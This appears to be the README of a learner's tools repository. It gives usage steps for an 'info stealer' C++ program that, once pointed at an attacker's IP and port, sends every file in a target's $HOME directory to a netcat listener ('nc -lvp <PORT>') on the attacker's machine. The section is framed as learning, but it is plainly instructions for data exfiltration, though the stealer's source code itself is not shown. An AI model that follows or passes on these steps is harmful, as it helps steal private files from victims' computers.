# t00l5
learning writing some tools in c++ and python

## Info stealer  

Two hosts, target and attacker.  
In the target host execute the executable of info_stealer.cpp (info_stealer.out), after changing <IP> and <PORT> in the code.  
the IP and PORT should be attacker's. Before executing:  
```
nc -lvp <PORT>
```
On the attacker's machine, and run the code on the target's machine, the attacker machine will receive all the files in $HOME directory, you can play with directory in the cpp code.
